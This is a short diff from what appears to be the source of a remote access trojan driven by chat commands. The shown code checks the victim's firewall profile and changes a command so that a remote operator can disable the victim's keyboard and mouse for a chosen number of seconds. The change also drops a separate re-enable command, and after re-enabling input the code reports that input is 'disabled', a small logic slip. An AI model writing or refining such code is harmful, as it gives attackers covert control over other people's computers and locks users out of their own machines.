@@ -302,13 +302,17 @@ Firewall state: {getoutput("netsh advfirewall show publicprofile").replace("----
                     try:
                         keyboard.Disable_keyboard()
                         mouse.Disable_mouse()
-                        send_msg("Mouse and Keyboard is disabled.")
-                    except: send_msg("Error;")
-                if command == "/ena_all":
-                    try:
+                        send_msg("how many seconds disable(write number in 8 seconds)?")
+                        sleep(8)
+                        try:
+                            num = int(read_msg())
+                        except: 
+                            send_msg("Invalid Input.")
+                            break
+                        sleep(num)
                         keyboard.Enable_keyboard()
                         mouse.Enable_mouse()
-                        send_msg("Mouse and Keyboard is enabled.")
+                        send_msg("Mouse and Keyboard is disabled.")
                     except: send_msg("Error;")
                 if command == "/chdir":
                     try:
